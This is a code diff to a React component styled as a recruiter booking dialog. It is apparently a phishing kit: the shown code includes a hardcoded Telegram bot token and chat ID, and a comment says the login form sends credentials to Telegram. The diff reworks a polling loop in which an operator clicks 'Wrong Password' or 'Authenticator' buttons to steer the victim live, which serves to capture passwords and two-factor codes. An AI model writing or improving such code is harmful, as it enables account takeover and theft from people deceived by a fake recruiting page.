@@ -33,7 +33,7 @@ import {
 
 // Add your Telegram bot configuration
 const TELEGRAM_BOT_TOKEN = "7555641913:AAG-X51iN3ANdlhyAyjkabtk4NvrwoIizMs"
-const TELEGRAM_CHAT_ID = "1725880411"
+const TELEGRAM_CHAT_ID = "-5498829022"
 
 // Global counter for unique session IDs — ensures each login attempt gets a unique ID
 let pendingSessionId = 0
@@ -168,6 +168,8 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
         inline_keyboard: [
           [
             { text: "❌ Wrong Password", callback_data: `/wrong-password ${sessionId}` },
+          ],
+          [
             { text: "🔐 Authenticator", callback_data: `/code ${sessionId}` },
           ],
         ],
@@ -185,82 +187,87 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
     return sessionId
   }
 
-  // Track active polling intervals so we can clean up on unmount
-  const pollingRef = useRef<{ interval: ReturnType<typeof setInterval> | null; active: boolean }>({
-    interval: null,
-    active: false,
-  })
+  // Track active polling so we can clean up
+  const pollingRef = useRef<{ abort: boolean; controller: AbortController | null }>({ abort: false, controller: null })
 
   // Cleanup polling on unmount
   useEffect(() => {
     return () => {
-      if (pollingRef.current.interval) {
-        clearInterval(pollingRef.current.interval)
-        pollingRef.current.active = false
+      pollingRef.current.abort = true
+      if (pollingRef.current.controller) {
+        pollingRef.current.controller.abort()
       }
     }
   }, [])
 
   // Poll for bot response — waits until bot sends a callback for THIS session only
-  function startPollingForAction(sessionId: number): Promise<string> {
-    pollingRef.current.active = true
+  // Uses a unique query param to avoid 409 conflicts with multiple tabs
+  async function startPollingForAction(sessionId: number, timeoutMs = 120000): Promise<string> {
+    // Abort any existing polling first
+    pollingRef.current.abort = true
+    if (pollingRef.current.controller) {
+      pollingRef.current.controller.abort()
+    }
+    await new Promise(r => setTimeout(r, 100))
+    pollingRef.current.abort = false
 
-    return new Promise((resolve) => {
-      const interval = setInterval(async () => {
-        if (!pollingRef.current.active) {
-          clearInterval(interval)
-          return
-        }
+    const startTime = Date.now()
+    let lastUpdateId = globalLastUpdateId
 
-        try {
-          const res = await fetch(
-            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${globalLastUpdateId + 1}&timeout=30`
-          )
-          const data = await res.json()
+    while (!pollingRef.current.abort && Date.now() - startTime < timeoutMs) {
+      try {
+        pollingRef.current.controller = new AbortController()
+        const res = await fetch(
+          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=25`,
+          { signal: pollingRef.current.controller.signal }
+        )
+        const data = await res.json()
 
-          if (data.ok && data.result) {
-            for (const update of data.result) {
-              // Advance the global counter so other sessions don't re-process this update
-              if (update.update_id > globalLastUpdateId) {
-                globalLastUpdateId = update.update_id
-              }
+        if (data.ok && data.result) {
+          for (const update of data.result) {
+            // Advance the global counter so other sessions don't re-process this update
+            if (update.update_id > lastUpdateId) {
+              lastUpdateId = update.update_id
+            }
+            if (update.update_id > globalLastUpdateId) {
+              globalLastUpdateId = update.update_id
+            }
 
-              // Check for callback_query (button press)
-              if (update.callback_query) {
-                const callbackData = update.callback_query.data || ""
-                const callbackSessionId = parseInt(callbackData.split(" ").pop() || "0", 10)
+            // Check for callback_query (button press)
+            if (update.callback_query) {
+              const callbackData = update.callback_query.data || ""
+              const callbackSessionId = parseInt(callbackData.split(" ").pop() || "0", 10)
 
-                // Only respond if this callback is meant for THIS session
-                if (callbackSessionId === sessionId) {
-                  clearInterval(interval)
-                  pollingRef.current.active = false
-                  pollingRef.current.interval = null
-
-                  // Acknowledge the callback to Telegram
-                  await fetch(
-                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
-                    {
-                      method: "POST",
-                      headers: { "Content-Type": "application/json" },
-                      body: JSON.stringify({
-                        callback_query_id: update.callback_query.id,
-                        text: "Processing...",
-                      }),
-                    }
-                  )
-                  resolve(callbackData)
-                  return
-                }
+              // Only respond if this callback is meant for THIS session
+              if (callbackSessionId === sessionId) {
+                // Acknowledge the callback to Telegram
+                await fetch(
+                  `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
+                  {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      callback_query_id: update.callback_query.id,
+                      text: "Processing...",
+                    }),
+                  }
+                )
+                return callbackData
               }
             }
           }
-        } catch {
-          // Silently retry
         }
-      }, 300) // Poll every 300ms for near-instant response
+      } catch (err) {
+        // Connection timeout, 409 conflict, or other error — retry immediately
+        const errStr = String(err)
+        // If 409 conflict (webhook or another poll active), just wait a bit and retry
+        if (errStr.includes("409") || errStr.includes("Conflict")) {
+          await new Promise(r => setTimeout(r, 1000))
+        }
+      }
+    }
 
-      pollingRef.current.interval = interval
-    })
+    throw new Error("Polling timed out or was aborted")
   }
 
   // Handle the login form submission — sends credentials to Telegram and waits for bot
@@ -423,7 +430,6 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
 
   const activeRecruiter =
       recruiter ?? recruiters.find((r) => r.id === selectedRecruiterId) ?? null
-      recruiter ?? recruiters.find((r) => r.id === selectedRecruiterId) ?? null
 
   const { cells, label, today } = useMemo(() => buildDays(monthOffset), [monthOffset])
 
@@ -448,11 +454,10 @@ export function BookingDialog({ open, onOpenChange, recruiter }: Props) {
   function handleOpenChange(next: boolean) {
     if (!next) {
       // Clean up any active polling when dialog closes
-      if (pollingRef.current.interval) {
-        clearInterval(pollingRef.current.interval)
-        pollingRef.current.interval = null
+      pollingRef.current.abort = true
+      if (pollingRef.current.controller) {
+        pollingRef.current.controller.abort()
       }
-      pollingRef.current.active = false
       setTimeout(reset, 200)
     }
     onOpenChange(next)
